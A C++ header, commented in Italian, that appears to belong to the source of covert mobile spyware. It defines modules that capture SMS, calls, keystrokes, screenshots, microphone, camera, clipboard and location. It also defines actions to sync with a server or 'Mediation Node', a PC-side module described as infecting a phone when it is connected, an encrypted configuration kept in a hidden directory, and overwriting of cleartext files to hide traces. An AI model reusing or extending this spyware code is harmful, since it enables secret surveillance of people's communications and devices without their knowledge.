#include "Common.h"
#include "Status.h"
#include "Encryption.h"

using namespace std;

#ifndef __Conf_h__
#define __Conf_h__

// Usata solo se non viene impostato un nome dal configuratore (Configuration.cfg)
#define DEFAULT_CONF_NAME L"PWR84nQ0C54WR.Y8n"

// Tag del file di configurazione
// Devono essere NULL terminated anche nel file
#define EVENT_CONF_DELIMITER "EVENTCONFS-"
#define AGENT_CONF_DELIMITER "AGENTCONFS-"
#define MOBIL_CONF_DELIMITER "MOBILCONFS-"
#define LOGRP_CONF_DELIMITER "LOGRPCONFS-"
#define BYPAS_CONF_DELIMITER "BYPASCONFS-"
#define ENDOF_CONF_DELIMITER "ENDOFCONFS-"

/**
* Define degli agenti/eventi/azioni/configurazioni
*/
#define AGENT				(UINT)0x1000
#define AGENT_SMS			AGENT + (UINT)0x1 // Cattura Email/Sms/Mms
#define AGENT_ORGANIZER		AGENT + (UINT)0x2 
#define AGENT_CALLLIST		AGENT + (UINT)0x3 
#define AGENT_DEVICE		AGENT + (UINT)0x4
#define AGENT_POSITION		AGENT + (UINT)0x5 // DWORD Interval | DWORD Timeout | DWORD Age
#define AGENT_CALL			AGENT + (UINT)0x6
#define AGENT_CALL_LOCAL	AGENT + (UINT)0x7
#define AGENT_KEYLOG		AGENT + (UINT)0x8
#define AGENT_SNAPSHOT		AGENT + (UINT)0x9
#define AGENT_URL			AGENT + (UINT)0xa
#define AGENT_IM			AGENT + (UINT)0xb
//#define AGENT_EMAIL			AGENT + (UINT)0xc 
#define AGENT_MIC			AGENT + (UINT)0xd
#define AGENT_CAM			AGENT + (UINT)0xe
#define AGENT_CLIPBOARD		AGENT + (UINT)0xf
#define AGENT_CRISIS		AGENT + (UINT)0x10
#define AGENT_APPLICATION	AGENT + (UINT)0x11
#define AGENT_LIVEMIC		AGENT + (UINT)0x12
#define AGENT_PDA			(UINT)0xDF7A		// Solo per PC (infetta il telefono quando viene collegato al pc)

#define EVENT				(UINT)0x2000
#define EVENT_TIMER			EVENT + (UINT)0x1 
#define EVENT_SMS			EVENT + (UINT)0x2 // DWORD buflen | WCHAR del numero | DWORD buflen | Testo
#define EVENT_CALL			EVENT + (UINT)0x3 
#define EVENT_CONNECTION	EVENT + (UINT)0x4 // CONF_CONNECTION_WIFI o CONF_CONNECTION_GPRS
#define EVENT_PROCESS		EVENT + (UINT)0x5
#define EVENT_CELLID		EVENT + (UINT)0x6
#define EVENT_QUOTA			EVENT + (UINT)0x7
#define EVENT_SIM_CHANGE	EVENT + (UINT)0x8
#define EVENT_LOCATION		EVENT + (UINT)0x9 // DWORD id azione sull'uscita | DWORD metri | 2DWORD Long | 2DWORD Lat
#define EVENT_AC			EVENT + (UINT)0xA
#define EVENT_BATTERY		EVENT + (UINT)0xB
#define EVENT_STANDBY		EVENT + (UINT)0xC

#define ACTION				(UINT)0x4000
#define ACTION_SYNC			ACTION + (UINT)0x1 // Sync su server
#define ACTION_UNINSTALL	ACTION + (UINT)0x2 
#define ACTION_RELOAD		ACTION + (UINT)0x3 
#define ACTION_SMS			ACTION + (UINT)0x4 
#define ACTION_TOOTHING		ACTION + (UINT)0x5
#define ACTION_START_AGENT	ACTION + (UINT)0x6
#define ACTION_STOP_AGENT	ACTION + (UINT)0x7
#define ACTION_SYNC_PDA		ACTION + (UINT)0x8 // Sync su Mediation Node
#define ACTION_EXECUTE		ACTION + (UINT)0x9
#define ACTION_SYNC_APN		ACTION + (UINT)0xa // Sync su APN
#define ACTION_LOG			ACTION + (UINT)0xb

#define CONFIGURATION				(UINT)0x8000
#define CONFIGURATION_BTGUID		CONFIGURATION + (UINT)0x1
#define CONFIGURATION_WIFIMAC		CONFIGURATION + (UINT)0x2
#define CONFIGURATION_WIFISSID		CONFIGURATION + (UINT)0x3
#define CONFIGURATION_BTPIN			CONFIGURATION + (UINT)0x4
#define CONFIGURATION_WIFIKEY		CONFIGURATION + (UINT)0x5
#define CONFIGURATION_HOSTNAME		CONFIGURATION + (UINT)0x6 // DWORD Lunghezza | Hostname in WCHAR
#define CONFIGURATION_SERVERIPV6	CONFIGURATION + (UINT)0x7
#define CONFIGURATION_LOGDIR		CONFIGURATION + (UINT)0x8
#define CONFIGURATION_CONNRETRY		CONFIGURATION + (UINT)0x9
#define CONFIGURATION_BTMAC			CONFIGURATION + (UINT)0xa
#define CONFIGURATION_WIFIENC		CONFIGURATION + (UINT)0xb // Il tipo di encryption utilizzato WEP/WPA/Niente
#define CONFIGURATION_WIFIIP		CONFIGURATION + (UINT)0xc // Ip del GW WiFi

/**
* Possibili configurazioni per ogni agente
*/
#define CONF_ACTION_NULL	(UINT)0xffffffff	// Azione nulla

#define CONF_SMS_GRAB_OLD	(UINT)0x1
#define CONF_SMS_GRAB_NEW	(UINT)0x2
#define CONF_SMS_GRAB_ALL	(UINT)(CONF_SMS_GRAB_OLD | CONF_SMS_GRAB_NEW)

#define CONF_PHONEBOOK_GRAB_OLD	(UINT)0x1
#define CONF_PHONEBOOK_GRAB_NEW	(UINT)0x2
#define CONF_PHONEBOOK_GRAB_ALL	(UINT)(CONF_PHONEBOOK_GRAB_OLD | CONF_PHONEBOOK_GRAB_NEW)

#define CONF_CALLLIST_GRAB_OLD	(UINT)0x1
#define CONF_CALLLIST_GRAB_NEW	(UINT)0x2
#define CONF_CALLLIST_GRAB_ALL	(UINT)(CONF_CALLLIST_GRAB_OLD | CONF_CALLLIST_GRAB_NEW)

#define CONF_SYNC_BT		(UINT)0x1
#define CONF_SYNC_WIFI		(UINT)0x2
#define CONF_SYNC_INTERNET	(UINT)0x4
#define CONF_SYNC_IPV4		(UINT)0x8
#define CONF_SYNC_IPV6		(UINT)0xf

#define CONF_TIMER_SINGLE	(UINT)0x0
#define CONF_TIMER_REPEAT	(UINT)0x1
#define CONF_TIMER_DATE		(UINT)0x2
#define CONF_TIMER_DELTA	(UINT)0x3
#define CONF_TIMER_DAILY	(UINT)0x4

#define CONF_CONNECTION_WIFI	(UINT)0x1
#define CONF_CONNECTION_GPRS	(UINT)0x2

#define CONF_FORCE_CONNECTION (UINT)0x2

class Status;
class Encryption;

class Conf
{
	/**
	 * Nome del file di configurazione preso da wConfName e poi cifrato tramite la classe Encryption.
	 */
	private: wstring strEncryptedConfName;
	private: Status *statusObj;

	/**
	 * Oggetto Encryption per la decifratura del file di configurazione e del suo nome.
	 */
	private: Encryption encryptionObj;

	/**
	 * Parsa la configurazione di un agente e popola la AgentStruct list. Torna TRUE se la lettura e' andata 
	 * a buon fine, FALSE altrimenti. Il parametro viene incrementato per puntare alla prossima sezione di conf.
	 * Num rappresenta il numero di agenti da leggere nella sezione.
	 */
	private: BOOL ParseAgent(BYTE **pAgent, UINT Num);

	/**
	 * Popola la EventStruct list leggendo tutti gli eventi dalla conf. Torna TRUE se la lettura e' andata 
	 * a buon fine, FALSE altrimenti. Il parametro viene incrementato per puntare alla prossima sezione.
	 * Num rappresenta il numero di eventi da leggere nella sezione.
	 */
	private: BOOL ParseEvent(BYTE **pEvent, UINT Num);

	/**
	 * Parsa la sezione azionie popola la ActionStruct list. Torna TRUE se la lettura e' andata 
	 * a buon fine, FALSE altrimenti. Il parametro viene incrementato per puntare alla prossima sezione.
	 * Num rappresenta il numero di azioni da leggere nella sezione. Questa funzione va richiamata SEMPRE
	 * Dopo la ParseEvent() visto che le azioni non hanno una sezione propria ma sono attaccate
	 * alla fine dela sezione eventi.
	 */
	private: BOOL ParseAction(BYTE **pAction, UINT Num);

	/**
	* Popola la ConfStruct list leggendo la sezione Configurazione dal file. Torna TRUE se la lista e' stata
	* popolata correttamente, FALSE altrimenti. Il parametro viene incrementato per puntare alla prossima 
	* riga di conf. Num rappresenta il numero di opzioni da leggere nella sezione.
	*/
	private: BOOL ParseConfiguration(BYTE **pConf, UINT Num);

	 /**
	 * Prende il file puntato da wName e lo riempie con dati casuali, va chiama prima di cancellare un
	 * file che e' stato scritto in chiaro. Torna TRUE se la chiamata va a buon fine FALSE altrimenti.
	 */
	private: BOOL FillFile(WCHAR *wName);

	/**
	* Prende un puntatore alla memoria e cerca la stringa finita da string, se non la trova entro uLen
	* byte torna NULL altrimenti torna dopo la stringa stessa (che DEVE essere NULL-terminata).
	*/
	private: BYTE* MemStringCmp(BYTE *memory, CHAR *string, UINT uLen);

	/**
	 * Prende il nome del file di configurazione, in chiaro dalla variabile globale, lo copia dentro wConfName, cifra 
	 * il nome e lo copia dentro strEncryptedConfName.
	 */
	public:  Conf();

	/**
	* Distruttore, libera tutto quello che era stato allocato.
	*/
	public: ~Conf();

	/**
	 * Prende il file di configurazione specificato nel parametro strEncryptedConfName, lo legge tramite la classe 
	 * Encryption e popola le liste AgentStruct, EventStruct, ActionStruct e ConfStruct. Torna TRUE se le 
	 * impostazioni sono state caricate con successo, FALSE se il file non e' stato trovato. In questo caso il 
	 * file viene creato e popolato con dei valori di default.
	 */
	public: BOOL LoadConf();

	/**
	 * Rimuove il file di configurazione torna TRUE se la rimozione e' andata a buon fine, FALSE altrimenti.
	 */
	public: BOOL RemoveConf();

	/**
	 * Torna il nome della configurazione di backup completo di path o una stringa vuota in caso di errore. 
	 * Se bCompletePath e' settato a TRUE viene tornato il nome del file completo di path, altrimenti
	 * il nome di ritorno complete il solo nome del file di backup.
	 */
	public: wstring GetBackupName(BOOL bCompletePath);

	/**
	* Torna TRUE se il file richiesto esiste nella directory nascosta, altrimenti torna FALSE.
	*/
	public: BOOL FileExists(wstring &strInFile);

};

#endif
